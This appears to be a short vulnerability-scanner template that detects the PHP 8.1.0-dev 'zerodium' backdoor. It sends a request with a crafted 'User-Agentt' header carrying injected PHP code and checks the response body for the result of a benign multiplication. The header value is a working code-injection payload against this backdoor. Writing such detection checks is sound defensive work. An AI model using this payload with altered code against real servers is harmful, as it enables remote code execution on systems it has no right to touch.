id: php-zerodium-backdoor-rce
brief:
    title: PHP 8.1.0-dev - Backdoor Remote Code Execution
    by: dhiyaneshDk
    level: critical
    about: PHP 8.1.0-dev contains a backdoor dubbed 'zerodiumvar_dump' which can allow the execution of arbitrary PHP code.
    label:
        - php
        - backdoor
        - rce
        - zerodium
        - vuln
    score: CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}'
      head:
        User-Agentt: zerodiumvar_dump(233333*333332);
      signs:
        - "on": word
          has:
            - int(77777355556)
          in: body
          need: all
